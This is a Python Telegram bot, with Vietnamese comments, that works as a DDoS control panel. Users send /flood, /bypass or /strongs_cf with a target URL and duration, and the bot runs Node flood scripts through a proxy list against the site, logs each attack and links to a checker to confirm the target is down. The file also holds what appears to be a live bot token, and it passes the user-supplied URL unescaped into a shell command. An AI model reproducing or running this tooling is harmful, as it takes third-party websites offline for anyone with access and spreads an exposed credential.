import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime
import json
import time
import pytz

ALLOWED_USER_ID = 7371969470  # ID của admin mặc định
TOKEN = '7258312263:AAGIDrOdqp4vyqwMnB4-gALpK0rGjxkH4s4'  # Token của bot Telegram
GROUPS_FILE, HISTORY_FILE, ADMINS_FILE = "allowed_groups.json", "attack_history.json", "admins.json"
task_info = {}  # Thông tin tiến trình tấn công
bot_status = True  # Trạng thái của bot, mặc định là bật

# Load và lưu dữ liệu JSON
def load_json(file, default_value=None):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default_value if default_value else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

# Kiểm tra nếu người dùng là admin
def is_admin(user_id):
    admins = load_json(ADMINS_FILE, [])
    return user_id == ALLOWED_USER_ID or user_id in admins

# Kiểm tra trạng thái của bot
def is_bot_on():
    return bot_status

# Chạy tiến trình tấn công
async def run_attack(url, attack_time, update, method, context):
    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện tấn công.")
    
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"
    commands = {
        'STRONGS-CF': f"node {heap_size} strongsflood.js {url} {attack_time} 5 5 live.txt",
        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 5 5 live.txt bypass",
        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 5 5 live.txt flood"
    }

    command = commands.get(method)
    if not command:
        return await update.message.reply_text("❌ Phương thức tấn công không hợp lệ.")

    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    task_info.setdefault(user_id, []).append({
        "url": url, "method": method, "remaining_time": attack_time,
        "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
        "message": None
    })

    # Lưu lịch sử tấn công
    history = load_json(HISTORY_FILE)
    history.append({"user_id": user_id, "username": update.effective_user.username, "url": url, "method": method, "attack_time": attack_time, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")})
    save_json(HISTORY_FILE, history)

    # Thông báo ngay lập tức vào nhóm
    group_chat_id = update.message.chat.id
    attack_result = f"🚨 Tấn công vào URL {url} đã bắt đầu.\nPhương thức: {method}\nThời gian tấn công: {attack_time} giây\n\n💬 Người dùng @{update.effective_user.username} 💥 đang thực hiện 📝 Vui lòng kiểm tra tin nhắn đến từ bot để theo dõi kết quả chi tiết."
    await context.bot.send_message(group_chat_id, attack_result)

    async def update_remaining_time():
        start_time = time.time()
        end_time = start_time + attack_time
        while time.time() < end_time:
            remaining_time = max(0, int(end_time - time.time()))
            task_text = f"🔴 Tiến trình tấn công:\nURL: {url}, Phương thức: {method}\n⏳ Thời gian còn lại: {remaining_time} giây\n\n🔗 Kiểm tra tình trạng: [Click here](https://check-host.net/check-http?host={parse.urlsplit(url).netloc})"
            
            # Gửi thông báo riêng cho người dùng
            if user_id in task_info and task_info[user_id]:
                if not task_info[user_id][0]["message"]:
                    task_info[user_id][0]["message"] = await update.effective_user.send_message(task_text, parse_mode='Markdown')
                else:
                    await task_info[user_id][0]["message"].edit_text(task_text, parse_mode='Markdown')
            
            await asyncio.sleep(3)

    # Tạo tác vụ cập nhật thời gian còn lại
    asyncio.create_task(update_remaining_time())
    await asyncio.sleep(attack_time)

    # Thông báo kết thúc tấn công cho người dùng
    await update.effective_user.send_message(f"Tấn công {method} vào URL {url} đã hoàn tất. ✅")
    
    # Xóa tiến trình tấn công khỏi task_info
    task_info[user_id] = [task for task in task_info[user_id] if task["task_id"] != process.pid]

# Lệnh /task để hiển thị các tiến trình tấn công đang chạy
async def task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in task_info or not task_info[user_id]:
        return await update.message.reply_text("❌ Hiện tại không có tiến trình tấn công nào đang chạy.")
    
    task_text = "🔴 Các tiến trình tấn công đang chạy:\n"
    for task in task_info[user_id]:
        task_text += f"🚨 URL: {task['url']}\n" \
                     f"⚔ Phương thức: {task['method']}\n" \
                     f"⏳ Thời gian còn lại: {task['remaining_time']} giây\n" \
                     f"🕒 Bắt đầu: {task['start_time']}\n\n"
    
    await update.message.reply_text(task_text)

# Lệnh tấn công
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện tấn công.")
    
    # Kiểm tra quyền của người dùng
    if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng tính năng này. Nếu muốn build server bot riêng, vui lòng liên hệ admin @VanThanhCoder6789.")
    
    # Kiểm tra cú pháp lệnh
    if len(context.args) < 2:
        return await help_command(update, context)

    try:
        url, attack_time = context.args[0], int(context.args[1])
        method = 'STRONGS-CF' if '/strongs_cf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')
        
        # Kiểm tra thời gian tấn công
        if attack_time > 120 and not is_admin(update.effective_user.id):
            return await update.message.reply_text("⚠️ Thời gian tấn công tối đa là 120 giây.")
        
        # Thực hiện tấn công
        asyncio.create_task(run_attack(url, attack_time, update, method, context))

    except (IndexError, ValueError):
        await update.message.reply_text("❌ Đã xảy ra lỗi.")

# Lịch sử tấn công
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    history = load_json(HISTORY_FILE)
    history_text = "📝 Lịch sử tấn công:\n"
    for entry in history:
        history_text += f"💥 URL: {entry['url']}\n⚔ Phương thức: {entry['method']}\n👤 Người dùng: @{entry['username']}\n⏱ Thời gian: {entry['start_time']}\n⏳ Thời gian tấn công: {entry['attack_time']} giây\n\n"
    await update.message.reply_text(history_text)

# Dừng tiến trình tấn công
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    subprocess.run("ps aux | grep 'tls-kill.js\\|strongsflood.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    await update.message.reply_text("✅ Tất cả các tiến trình tấn công đã bị dừng.")

# Thêm nhóm vào danh sách nhóm được phép
async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        group_id = int(context.args[0])
        allowed_groups = load_json(GROUPS_FILE)
        if group_id in allowed_groups:
            return await update.message.reply_text("❌ Nhóm này đã có trong danh sách.")
        
        allowed_groups.append(group_id)
        save_json(GROUPS_FILE, allowed_groups)
        await update.message.reply_text(f"✅ Nhóm {group_id} đã được thêm vào danh sách nhóm được phép.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID nhóm hợp lệ.")

# Thêm người dùng admin vào danh sách
async def add_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        new_admin_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if new_admin_id in admins:
            return await update.message.reply_text("❌ Người dùng này đã là admin.")
        
        admins.append(new_admin_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {new_admin_id} đã được thêm vào danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

# Xóa người dùng admin
async def delete_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        user_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if user_id not in admins:
            return await update.message.reply_text("❌ Người dùng này không phải là admin.")
        
        admins.remove(user_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {user_id} đã được xóa khỏi danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

# Xóa toàn bộ lịch sử tấn công
async def delete_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    save_json(HISTORY_FILE, [])
    await update.message.reply_text("✅ Toàn bộ lịch sử tấn công đã được xóa.")

# Lệnh bật bot
async def on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = True
    await update.message.reply_text("✅ Bot đã được bật.")

# Lệnh tắt bot
async def off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = False
    await update.message.reply_text("❌ Bot đã bị tắt.")

# Lệnh giúp đỡ
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🌐 **Lệnh Bot - Tấn Công DDoS**:

### Lệnh dành cho người dùng:
1. **/flood [url] [time]** - 🌊 Tấn công Flood vào URL với thời gian (giây).
2. **/bypass [url] [time]** - ⚡️ Tấn công Bypass vào URL với thời gian (giây).
3. **/strongs_cf [url] [time]** - 🔥 Tấn công STRONGS-CF vào URL với thời gian (giây).
4. **/task** - 📝 Xem các tiến trình tấn công đang chạy.
5. **/help** - ❓ Hiển thị bảng hướng dẫn lệnh bot.

### Lệnh chỉ dành cho Admin:
6. **/stop** - ⛔️ Dừng tất cả tiến trình tấn công (chỉ admin mới có quyền).
7. **/addgroup [group_id]** - 🔧 Thêm nhóm vào danh sách được phép sử dụng bot (chỉ admin).
8. **/history** - 📜 Kiểm tra lịch sử tấn công (chỉ admin).
9. **/adduser [user_id]** - 👤 Thêm người dùng vào danh sách admin (chỉ admin).
10. **/deleteuser [user_id]** - ❌ Xóa người dùng khỏi danh sách admin (chỉ admin).
11. **/deletehistory** - 🗑️ Xóa toàn bộ lịch sử tấn công (chỉ admin).
12. **/on** - 🔓 Bật bot (chỉ admin).
13. **/off** - 🔒 Tắt bot (chỉ admin).

---

🛠️ **Lưu ý**:
- 🔒 Các lệnh như **`/adduser`**, **`/deleteuser`**, **`/addgroup`**, **`/deletehistory`**, **`/on`**, và **`/off`** chỉ có thể sử dụng bởi **Admin**.
- ✅ Các lệnh tấn công như **`/flood`**, **`/bypass`**, **`/strongs_cf`** yêu cầu thời gian tấn công được xác định và URL hợp lệ.
- 💬 Sử dụng **/task** để theo dõi các tiến trình tấn công đang chạy.
- 📅 **Lịch sử** có thể được xem với lệnh **/history** (chỉ admin).
- 🛑 Bạn có thể dừng các tiến trình tấn công bằng lệnh **/stop** (chỉ admin).

---

🚀 **Chúc bạn thành công!**
⚡️ **BOT power kém không áp dụng đối với host trâu bò.**
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')


# Khởi chạy bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("strongs_cf", attack))
    application.add_handler(CommandHandler("task", task))  # Thêm lệnh /task
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("adduser", add_user_admin))
    application.add_handler(CommandHandler("deleteuser", delete_user_admin))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("history", history))
    application.add_handler(CommandHandler("deletehistory", delete_history))
    application.add_handler(CommandHandler("on", on))
    application.add_handler(CommandHandler("off", off))
    application.run_polling()

if __name__ == "__main__":
    main()
